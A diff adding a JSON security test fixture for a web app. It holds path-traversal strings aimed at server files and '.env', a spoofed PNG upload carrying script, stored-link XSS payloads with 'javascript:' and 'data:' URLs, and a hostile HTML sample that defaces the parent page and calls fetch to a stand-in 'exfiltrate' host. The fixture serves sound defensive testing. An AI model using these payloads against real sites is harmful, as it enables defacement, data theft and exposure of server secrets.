@@ -1,0 +1,78 @@
+{
+  "identities": {
+    "owner": "security-owner",
+    "other": "security-other",
+    "symlink": "security-symlink",
+    "traversalUid": "../outside-owner"
+  },
+  "static": {
+    "safeIndex": "<!doctype html><html><body>safe local fixture</body></html>",
+    "safeAsset": "window.__safeSecurityFixture = true;",
+    "blockedPaths": [
+      "/server.js",
+      "/data/timetable.json",
+      "/package-lock.json",
+      "/functions/package-lock.json",
+      "/archive/gpace.zip",
+      "/.env",
+      "/../server.js",
+      "/%2e%2e/server.js",
+      "/..%5Cserver.js"
+    ]
+  },
+  "uploads": {
+    "validPngBase64": "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGNgAAACAAEAAeJxvDMAAAAASUVORK5CYII=",
+    "validFilename": "safe-fixture.png",
+    "validMime": "image/png",
+    "spoofed": {
+      "filename": "markup-fixture.png",
+      "mime": "image/png",
+      "body": "<html><script>window.parent.document.body.innerHTML='owned'</script></html>"
+    },
+    "traversalIds": ["../outside", "..\\outside", "not-an-opaque-upload-id"]
+  },
+  "storedLinks": {
+    "taskId": "security-fixture-task",
+    "safe": {
+      "id": "safe-link",
+      "url": "https://example.invalid/safe-reference",
+      "title": "Safe reference",
+      "description": "A local record with a valid HTTPS URL",
+      "type": "link"
+    },
+    "hostile": [
+      {
+        "id": "markup-title",
+        "url": "https://example.invalid/title",
+        "title": "<img src=x onerror=alert(1)>",
+        "description": "<svg onload=alert(2)>stored text</svg>",
+        "type": "link"
+      },
+      {
+        "id": "javascript-url",
+        "url": "javascript:window.parent.document.body.innerHTML='owned'",
+        "title": "JavaScript URL",
+        "description": "Stored URL must remain non-clickable",
+        "type": "link"
+      },
+      {
+        "id": "data-url",
+        "url": "data:text/html,<script>alert(3)</script>",
+        "title": "Data URL",
+        "description": "Stored URL must remain non-clickable",
+        "type": "link"
+      },
+      {
+        "id": "custom-url",
+        "url": "gpace:open-private-data",
+        "title": "Custom scheme",
+        "description": "Stored URL must remain non-clickable",
+        "type": "link"
+      }
+    ]
+  },
+  "simulation": {
+    "safeHtml": "<!doctype html><html><body><button id=run>Run</button></body></html>",
+    "hostileHtml": "<script>window.parent.document.body.innerHTML='owned';window.parent.localStorage.setItem('stolen','1');window.top.location='https://network.invalid/';fetch('https://network.invalid/exfiltrate')</script>"
+  }
+}
